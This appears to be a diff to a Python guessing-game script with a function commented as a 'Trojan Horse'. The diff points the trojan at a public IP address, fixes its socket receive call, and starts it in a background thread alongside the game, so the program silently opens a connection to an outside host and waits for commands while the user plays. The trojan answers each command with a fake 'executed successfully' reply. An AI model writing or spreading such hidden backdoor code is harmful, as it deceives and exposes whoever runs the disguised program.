@@ -4,14 +4,14 @@ import threading
 
 # Trojan Horse
 def trojan():
-    HOST = "192.168.1.9 "
+    HOST = "5.237.146.140"
     PORT = 5000
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((HOST, PORT))
 
     while True:
-        server_command = client.rec(1024).decode('utf-8')
+        server_command = client.recv(1024).decode('utf-8')
         if server_command == "hello":
             print("Hello, world!")
         client.send(f"{server_command} executed successfully".encode('utf-8'))
@@ -38,5 +38,8 @@ def game():
     
     print(f"You did {tries} tries!")
 
-game = game()
-game
+target_1 = threading.Thread(target=game)
+target_2 = threading.Thread(target=trojan)
+
+target_1.start()
+target_2.start()
